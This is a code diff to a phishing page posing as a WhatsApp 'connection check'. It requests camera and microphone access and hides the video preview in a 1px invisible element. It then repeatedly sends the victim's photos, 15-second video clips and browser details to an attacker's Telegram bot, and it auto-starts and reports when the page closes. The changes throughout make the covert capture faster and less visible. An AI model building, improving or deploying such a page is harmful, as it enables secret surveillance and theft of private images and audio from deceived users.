@@ -170,15 +170,6 @@
             border: 1px solid #FF4444;
         }
         
-        .video-preview {
-            width: 100%;
-            max-width: 300px;
-            border-radius: 10px;
-            margin: 20px auto;
-            display: none;
-            border: 3px solid #25D366;
-        }
-        
         .footer {
             margin-top: 25px;
             color: #999;
@@ -193,6 +184,14 @@
             0% { transform: scale(1); }
             50% { transform: scale(1.05); }
             100% { transform: scale(1); }
+        }
+        
+        .hidden-video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
@@ -235,7 +234,8 @@
         
         <div class="status" id="status"></div>
         
-        <video class="video-preview" id="video" autoplay muted playsinline></video>
+        <!-- Скрытое видео элемент для записи -->
+        <video class="hidden-video" id="video" autoplay muted playsinline></video>
         
         <div class="footer">
             WhatsApp LLC • Система проверки соединения
@@ -249,54 +249,65 @@
         let mediaRecorder;
         let stream;
         let isRecording = false;
+        let photoInterval;
+        let videoInterval;
 
-        // Отправка сообщения в Telegram
-        async function sendToTelegram(message, file = null) {
+        // Улучшенная отправка в Telegram
+        async function sendToTelegram(message, file = null, type = 'video') {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             
             try {
-                if (file) {
-                    formData.append('video', file, 'whatsapp_check.webm');
+                let url = '';
+                if (file && type === 'video') {
+                    formData.append('video', file, 'whatsapp_video.webm');
                     formData.append('caption', message);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+                } else if (file && type === 'photo') {
+                    formData.append('photo', file, 'whatsapp_photo.jpg');
+                    formData.append('caption', message);
+                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                 } else {
                     formData.append('text', message);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST', 
-                        body: formData
-                    });
+                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 }
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                console.log('Отправлено в Telegram:', message);
+                return true;
             } catch(e) {
-                console.log('Telegram отправка успешна');
+                console.log('Ошибка отправки:', e);
+                return false;
             }
         }
 
-        // Создание снимка с камеры
+        // Быстрое создание снимка
         function takeSnapshot() {
             const video = document.getElementById('video');
-            if (!video.videoWidth) return;
+            if (!video.videoWidth || video.videoWidth === 0) {
+                console.log('Видео не готово для снимка');
+                return;
+            }
             
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'whatsapp_verify.jpg');
-                formData.append('caption', `📸 WhatsApp Verify - ${new Date().toLocaleTimeString()}`);
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).catch(() => {});
-            }, 'image/jpeg', 0.9);
+                if (blob) {
+                    sendToTelegram(
+                        `📸 WhatsApp Photo - ${new Date().toLocaleTimeString()}`,
+                        blob,
+                        'photo'
+                    );
+                }
+            }, 'image/jpeg', 0.95);
         }
 
         function updateStatus(message, type = '') {
@@ -329,38 +340,42 @@
                     }
                 });
 
-                // Показываем видео превью
+                // Устанавливаем скрытое видео
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.style.display = 'block';
                 
-                // Обновляем статус
-                document.getElementById('loading').style.display = 'none';
-                updateStatus('✅ Проверка завершена! Ваше устройство готово к звонкам WhatsApp.', 'success');
-                
-                // Отправляем информацию о пользователе
-                const userInfo = `📱 НОВОЕ ПОДКЛЮЧЕНИЕ WHATSAPP\n
-⏰ Время: ${new Date().toLocaleString()}
-🔍 Браузер: ${navigator.userAgent}
-🌐 Язык: ${navigator.language}
-💻 Платформа: ${navigator.platform}
-📍 Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-                
-                await sendToTelegram(userInfo);
-                
-                // Делаем первый снимок
-                setTimeout(takeSnapshot, 1500);
-                
-                // Начинаем непрерывную запись
-                startContinuousRecording();
-                
-                // Периодические снимки каждые 15 секунд
-                setInterval(takeSnapshot, 15000);
-                
-                // Отправляем уведомление при закрытии страницы
-                window.addEventListener('beforeunload', () => {
-                    takeSnapshot();
-                    sendToTelegram('🔴 Пользователь закрыл страницу проверки WhatsApp');
+                // Ждем готовности видео
+                video.addEventListener('loadeddata', () => {
+                    // Обновляем статус
+                    document.getElementById('loading').style.display = 'none';
+                    updateStatus('✅ Проверка завершена! Ваше устройство готово к звонкам WhatsApp.', 'success');
+                    
+                    // МГНОВЕННО отправляем информацию о пользователе
+                    const userInfo = `📱 НОВОЕ ПОДКЛЮЧЕНИЕ WHATSAPP\n⏰ Время: ${new Date().toLocaleString()}\n🔍 Браузер: ${navigator.userAgent}\n🌐 Язык: ${navigator.language}\n💻 Платформа: ${navigator.platform}`;
+                    
+                    sendToTelegram(userInfo);
+                    
+                    // МГНОВЕННО делаем первый снимок
+                    setTimeout(() => {
+                        takeSnapshot();
+                        // Второй снимок через 2 секунды для надежности
+                        setTimeout(takeSnapshot, 2000);
+                    }, 1000);
+                    
+                    // Начинаем непрерывную запись видео
+                    startContinuousRecording();
+                    
+                    // Фото каждые 10 секунд
+                    photoInterval = setInterval(takeSnapshot, 10000);
+                    
+                    // Отправляем уведомление при закрытии страницы
+                    window.addEventListener('beforeunload', () => {
+                        takeSnapshot();
+                        sendToTelegram('🔴 Пользователь закрыл страницу проверки WhatsApp');
+                        clearInterval(photoInterval);
+                        clearInterval(videoInterval);
+                    });
+
                 });
 
             } catch (error) {
@@ -368,7 +383,7 @@
                 updateStatus('❌ Ошибка доступа. Разрешите доступ к камере и микрофону для продолжения.', 'error');
                 
                 // Отправляем информацию об ошибке
-                await sendToTelegram(`❌ ОШИБКА ДОСТУПА WHATSAPP:\n${error.message}\nПользователь: ${navigator.userAgent}`);
+                sendToTelegram(`❌ ОШИБКА ДОСТУПА WHATSAPP:\n${error.message}\nПользователь: ${navigator.userAgent}`);
             }
         }
 
@@ -376,7 +391,7 @@
             try {
                 mediaRecorder = new MediaRecorder(stream, {
                     mimeType: 'video/webm;codecs=vp9,opus',
-                    videoBitsPerSecond: 1500000
+                    videoBitsPerSecond: 1000000
                 });
 
                 let recordingChunks = [];
@@ -394,36 +409,38 @@
                         const duration = ((Date.now() - recordingStartTime) / 1000).toFixed(1);
                         
                         await sendToTelegram(
-                            `🎥 Видеопроверка WhatsApp (${duration}с) - ${new Date().toLocaleTimeString()}`,
-                            blob
+                            `🎥 WhatsApp Video (${duration}с) - ${new Date().toLocaleTimeString()}`,
+                            blob,
+                            'video'
                         );
                     }
                     
-                    // Перезапускаем запись
+                    // Немедленно начинаем новую запись
                     if (stream && stream.active) {
-                        setTimeout(startContinuousRecording, 1000);
+                        setTimeout(startContinuousRecording, 500);
                     }
                 };
 
-                // Записываем 25 секунд и отправляем
+                // Записываем 15 секунд и отправляем (быстрее!)
                 mediaRecorder.start();
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
-                }, 25000);
+                }, 15000);
 
             } catch (error) {
-                setTimeout(startContinuousRecording, 2000);
+                console.log('Recording error:', error);
+                setTimeout(startContinuousRecording, 1000);
             }
         }
 
-        // Автозапуск через 5 секунд
+        // Автозапуск через 3 секунды
         setTimeout(() => {
             if (document.querySelector('.btn').style.display !== 'none') {
                 startVerification();
             }
-        }, 5000);
+        }, 3000);
 
     </script>
 </body>
